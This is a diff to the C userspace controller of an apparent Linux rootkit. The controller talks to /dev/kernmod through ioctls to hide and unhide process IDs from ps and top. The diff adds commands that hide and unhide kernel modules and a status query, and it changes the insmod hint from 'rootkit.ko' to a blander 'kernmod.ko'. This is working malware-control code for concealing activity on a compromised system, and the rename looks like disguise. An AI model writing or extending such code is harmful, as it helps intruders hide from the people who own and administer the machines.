@@ -18,7 +18,7 @@ int main(int argc, char *argv[])
     if (fd < 0) {
         perror("open /dev/kernmod");
         if (errno == ENOENT)
-            fprintf(stderr, "Is the kernel module loaded? Try: sudo insmod rootkit.ko\n");
+            fprintf(stderr, "Is the kernel module loaded? Try: sudo insmod kernmod.ko\n");
         else if (errno == EACCES)
             fprintf(stderr, "Permission denied. Try running with sudo.\n");
         return 1;
@@ -84,11 +84,11 @@ int main(int argc, char *argv[])
         ret = ioctl(fd, IOCTL_HIDE_PID, buf);
         if (ret < 0) {
             if (errno == EEXIST)
-                fprintf(stderr, "PID %s is already hidden\n", argv[2]);
+                fprintf(stderr, "PID '%s' is already hidden\n", argv[2]);
             else
                 perror("ioctl HIDE_PID failed");
         } else {
-            printf("PID %s is now hidden from ps/top\n", argv[2]);
+            printf("PID '%s' is now hidden from ps/top\n", argv[2]);
         }
 
     } else if (strcmp(argv[1], "unhide-pid") == 0) {
@@ -109,13 +109,65 @@ int main(int argc, char *argv[])
         ret = ioctl(fd, IOCTL_UNHIDE_PID, buf);
         if (ret < 0) {
             if (errno == ENOENT)
-                fprintf(stderr, "PID %s is not in the hidden list\n", argv[2]);
+                fprintf(stderr, "PID '%s' is not in the hidden list\n", argv[2]);
             else
                 perror("ioctl UNHIDE_PID failed");
         } else {
-            printf("PID %s is now visible\n", argv[2]);
+            printf("PID '%s' is now visible\n", argv[2]);
         }
-        
+
+    } else if (strcmp(argv[1], "hide-module") == 0) {
+        if (argc < 3) {
+            fprintf(stderr, "Error: module name required\n");
+            close(fd);
+            return 1;
+        }
+        memset(buf, 0, sizeof(buf));
+        strncpy(buf, argv[2], 63);
+
+        ret = ioctl(fd, IOCTL_HIDE_MODULE, buf);
+        if (ret < 0) {
+            if (errno == EEXIST)
+                fprintf(stderr, "Module '%s' is already hidden\n", argv[2]);
+            else if (errno == ENOENT) 
+                fprintf(stderr, "Module '%s' not found\n", argv[2]);
+            else 
+                perror("ioctl HIDE_MODULE failed");
+        } else {
+            printf("Module '%s' is now hidden\n", argv[2]);
+        }
+
+    } else if (strcmp(argv[1], "unhide-module") == 0) {
+        if (argc < 3) { 
+            fprintf(stderr, "Error: module name required\n"); close(fd);
+            return 1;
+        }
+        memset(buf, 0, sizeof(buf));
+        strncpy(buf, argv[2], 63);
+
+        ret = ioctl(fd, IOCTL_UNHIDE_MODULE, buf);
+        if (ret < 0) {
+            if (errno == ENOENT) 
+                fprintf(stderr, "Module '%s' is not in hidden list\n", argv[2]);
+            else 
+                perror("ioctl HIDE_MODULE failed");
+        } else {
+            printf("Module '%s' is now visible\n", argv[2]);
+        }
+
+    } else if (strcmp(argv[1], "status") == 0) {
+        char buffer[4096];
+        struct kernmod_status_request req = {
+            .buf = buffer,
+            .buf_size = sizeof(buffer),
+            .out_len = 0
+        };
+
+        ret = ioctl(fd, IOCTL_GET_STATUS, &req);
+        if (ret == 0) {
+            write(STDOUT_FILENO, buffer, req.out_len);
+        }
+
     } else {
         fprintf(stderr, "Unknown command: %s\n", argv[1]);
         close(fd);
